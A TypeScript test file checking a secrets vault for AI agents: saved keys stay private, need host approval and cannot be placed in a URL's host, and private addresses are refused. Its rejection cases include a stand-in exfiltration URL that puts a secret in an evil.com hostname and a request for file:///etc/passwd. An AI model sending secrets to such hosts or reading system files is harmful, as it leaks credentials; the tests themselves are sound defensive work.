import { describe, expect, it, vi } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
vi.mock('server-only', () => ({}));
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vault-'));
vi.mock('@/lib/config', () => ({ CTX_ROOT: dir, getCTXRoot: () => dir, getAllowedRootsConfigPath: () => path.join(dir, 'roots.json') }));
vi.mock('@/lib/db', async () => { const { default: Database } = await import('better-sqlite3'); return { db: new Database(':memory:') }; });
vi.mock('../attachments', () => ({ claimAttachments: () => {}, saveAttachment: () => ({ id: 1 }), MAX_FILE_BYTES: 10_000_000 }));
vi.mock('@/lib/slack/app', () => ({ agencyIdNow: () => 'agc_test' }));
const S = await import('../secrets');
const { privateIp } = await import('../send-file');

describe('saved keys for agents (lib/ai/secrets.ts)', () => {
  it('saves by name in a 600 file per agency and never echoes the value', () => {
    expect(S.saveKey('CALENDLY_TOKEN', 'abcd1234wxyz')).toBe('wxyz');
    const f = S.VAULT_FILE();
    expect(f).toBe(path.join(dir, 'vault', 'agc_test', 'agent-vault.env'));
    expect(fs.statSync(f).mode & 0o777).toBe(0o600);
    expect(S.listSecrets()).toContain('CALENDLY_TOKEN');
    expect(S.listSecrets()).not.toContain('abcd1234');
    expect(() => S.saveKey('bad name', 'x')).toThrow();
  });
  it('a key goes in headers, body or path, never the host, and must exist', () => {
    expect(S.checkRequest({ url: 'https://api.calendly.com/users/me', headers: { Authorization: 'Bearer {{secret:CALENDLY_TOKEN}}' } })).toBe('api.calendly.com');
    expect(() => S.checkRequest({ url: 'https://{{secret:CALENDLY_TOKEN}}.evil.com/' })).toThrow(/host/);
    expect(() => S.checkRequest({ url: 'https://x.com/?k={{secret:NOPE}}' })).toThrow(/No saved key/);
    expect(() => S.checkRequest({ url: 'file:///etc/passwd' })).toThrow();
  });
  it('the first trip of a key to a host needs a yes, then it is remembered', () => {
    const r = { url: 'https://api.calendly.com/x', headers: { A: '{{secret:CALENDLY_TOKEN}}' } };
    expect(S.unapproved(r)).toEqual(['CALENDLY_TOKEN']);
    S.approveHost('CALENDLY_TOKEN', 'api.calendly.com');
    expect(S.unapproved(r)).toEqual([]);
  });
  it('private addresses are refused', () => {
    for (const ip of ['127.0.0.1', '10.1.2.3', '192.168.0.4', '172.20.0.1', '169.254.169.254', '::1', 'fd00::1', '::ffff:127.0.0.1']) expect(privateIp(ip)).toBe(true);
    expect(privateIp('8.8.8.8')).toBe(false);
  });
});
